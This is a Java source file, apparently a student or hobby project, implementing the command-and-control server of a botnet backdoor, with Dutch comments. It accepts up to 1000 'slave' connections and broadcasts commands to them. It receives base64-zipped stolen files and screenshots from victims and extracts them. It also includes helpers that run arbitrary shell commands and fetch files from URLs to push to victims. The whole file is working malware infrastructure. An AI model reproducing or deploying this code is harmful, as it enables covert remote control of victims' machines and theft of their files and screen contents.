package backdoorserver;

//import static backdoorserver.clientThread.temp;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Base64;
import java.util.TreeSet;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
//import net.lingala.zip4j.core.ZipFile;
//import net.lingala.zip4j.exception.ZipException;

public class Server {

    static Socket clientSocket = null;
    static ServerSocket serverSocket = null;
    private String ip = "";
    private static String OS = System.getProperty("os.name").toLowerCase();
    // This chat server can accept up to 1000 clients' connections
    static clientThread t[] = new clientThread[1000];
    private static File temp;

    public static void main(String args[]) {

        // The default port
        int port_number = 4600;

        if (args.length < 1) {
            System.out.println("Now using port number=" + port_number);
        } else {
            port_number = Integer.valueOf(args[0]).intValue();
        }

        try {
            serverSocket = new ServerSocket(port_number);
        } catch (IOException e) {
            System.out.println(e);
        }

        while (true) {
            try {
                clientSocket = serverSocket.accept();
                for (int i = 0; i <= 999; i++) {
                    if (t[i] == null) {
                        (t[i] = new clientThread(clientSocket, t)).start();
                        break;
                    }
                }
            } catch (IOException e) {
                System.out.println(e);
            }
        }
    }

    public static String download(String file) throws IOException { // uploaden naar victim via url
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        URL url = new URL(file);
        InputStream in = url.openStream();
        Files.copy(in, Paths.get(temp.getAbsolutePath()), StandardCopyOption.REPLACE_EXISTING);
        in.close();
        return temp.getAbsolutePath();

    }

    public static String unZipIt(String zipFile, String outputFolder) {
        String OUTPUT_FOLDER = temp.getAbsolutePath() + "folder";
        byte[] buffer = new byte[1024];

        try {

            //create output directory is not exists
            File folder = new File(OUTPUT_FOLDER);
            if (!folder.exists()) {
                folder.mkdir();
            }

            //get the zip file content
            ZipInputStream zis
                    = new ZipInputStream(new FileInputStream(zipFile));
            //get the zipped file list entry
            ZipEntry ze = zis.getNextEntry();

            while (ze != null) {

                String fileName = ze.getName();
                File newFile = new File(outputFolder + File.separator + fileName);

                //create all non exists folders
                //else you will hit FileNotFoundException for compressed folder
                new File(newFile.getParent()).mkdirs();

                FileOutputStream fos = new FileOutputStream(newFile);

                int len;
                while ((len = zis.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }

                fos.close();
                ze = zis.getNextEntry();
            }

            zis.closeEntry();
            zis.close();

        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return OUTPUT_FOLDER;
    }

    public static String ExecuteMyCommand(String commando) { // hier sturen we ons command ( voorbeeld "dir" als commando)

        try {
            if (commando.length() < 1) {
                return "Geen commndo probeer opnieuw.";
            }
            String outputlines = "";
            if (OS.contains("windows")) {
                Process p = Runtime.getRuntime().exec("cmd /c " + commando);
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

                String regel = "";
                while ((regel = br.readLine()) != null) {
                    outputlines += regel + "\n"; // System.err.println(regel);
                }
                return outputlines;
            }
            Process p = Runtime.getRuntime().exec(commando);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String regel = "";
            while ((regel = br.readLine()) != null) {
                outputlines += regel + "\n"; // System.err.println(regel);
            }
            return outputlines;

        } catch (IOException ex) {
            return ex.getMessage();
        }
    }

}

class clientThread extends Thread {

    DataInputStream is = null;
    PrintStream os = null;
    Socket clientSocket = null;
    clientThread t[];

    public clientThread(Socket clientSocket, clientThread[] t) {
        this.clientSocket = clientSocket;
        this.t = t;
    }
    static File temp;

    public static void Base64DecodeAndExtractZip(String a) throws IOException {
        temp = File.createTempFile("temp", Long.toString(System.nanoTime()));
        byte[] Decoded = Base64.getDecoder().decode(a);
        FileOutputStream fos = new FileOutputStream(temp);
        fos.write(Decoded);
        fos.close();
        System.out.println("location of file or picture: " + unZipIt(temp.toString(), temp.getAbsolutePath() + "folder"));
    }

//    public static String zipextract(String z) {
//        File dir = new File(temp + "folder");
//        try {
//            ZipFile zipFile = new ZipFile(temp.getAbsolutePath());
//            zipFile.extractAll(temp.getAbsolutePath() + "folder");
//        } catch (ZipException e) {
//            e.printStackTrace();
//        }
//        return temp + "folder";
//    }
    public static String unZipIt(String zipFile, String outputFolder) {
        String OUTPUT_FOLDER = temp.getAbsolutePath() + "folder";
        byte[] buffer = new byte[1024];

        try {

            //create output directory is not exists
            File folder = new File(OUTPUT_FOLDER);
            if (!folder.exists()) {
                folder.mkdir();
            }

            //get the zip file content
            ZipInputStream zis
                    = new ZipInputStream(new FileInputStream(zipFile));
            //get the zipped file list entry
            ZipEntry ze = zis.getNextEntry();

            while (ze != null) {

                String fileName = ze.getName();
                File newFile = new File(outputFolder + File.separator + fileName);

                //create all non exists folders
                //else you will hit FileNotFoundException for compressed folder
                new File(newFile.getParent()).mkdirs();

                FileOutputStream fos = new FileOutputStream(newFile);

                int len;
                while ((len = zis.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }

                fos.close();
                ze = zis.getNextEntry();
            }

            zis.closeEntry();
            zis.close();

        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return OUTPUT_FOLDER;
    }

    public void run() {
        TreeSet list = new TreeSet();
        String line = "";
        String name;
        Boolean ragequit = false;
        String ip = clientSocket.getInetAddress().toString();
        try {
            is = new DataInputStream(clientSocket.getInputStream());
            os = new PrintStream(clientSocket.getOutputStream());
            clientSocket.setKeepAlive(true);
        } catch (Exception e) {
            try {
                Thread.currentThread().join();
            } catch (InterruptedException ex) {
                Logger.getLogger(clientThread.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        os.println("new user added to our botnet");
        for (int i = 0; i <= 999; i++) {
            if (t[i] != null && t[i] != this) {
                t[i].os.println("*** A new slave entered the botnet !!! ***");
            }
        }
        long begin = System.currentTimeMillis();
        while (true) {
            byte a = 1;
            try {
                line = "";
                do {
                    if (clientSocket.getInputStream().available() > 0) {
                        a = is.readByte();
                        line = line + (char) a;
                    } else {
                        sleep(50);
                        if (System.currentTimeMillis() - begin > 20000) {
                            begin = System.currentTimeMillis();
                            os.println("connection closed with " + ip);
                            is.close();
                            os.close();
                            clientSocket.close();
                            return;
                        }

                        if (!clientSocket.isClosed() && clientSocket.isConnected() && !clientSocket.isInputShutdown() && !clientSocket.isOutputShutdown()) {
                            sleep(10);
                        } else {
                            os.println("connection closed with " + ip);
                            is.close();
                            os.close();
                            clientSocket.close();
                            return;
                        }
                    }
                } while (a != 10);
                begin = System.currentTimeMillis();
                line = line.replace("\r\n", "");
                line = line.replace("\n", "");
            } catch (Exception e) {
                line = "";
            }
            if (line.startsWith("downloadeble file = ")) {
                int i = 20;
                String s = line.substring(i);
                try {
                    //Base64DecodeAndExtractZip(s);
                    Base64DecodeAndExtractZip(s);
                } catch (IOException ex) {

                }

            }
            if (line.startsWith("screenshot: ")) {
                int i = 12;
                String s = line.substring(i);
                try {
                    //Base64DecodeAndExtractZip(s);
                    Base64DecodeAndExtractZip(s);
                } catch (IOException ex) {

                }

            }
            // schrijft naar iedereen
            if (!line.equals("ping") && !line.startsWith("downloadeble file = ") && !line.startsWith("screenshot: ")) {
                for (int i = 0; i <= 999; i++) {
                    if (t[i] != null && line.isEmpty() == false && !line.equals("")) {
                        t[i].os.println("<" + "server" + "> " + line);
                    }
                }
            }

        }
    }
}
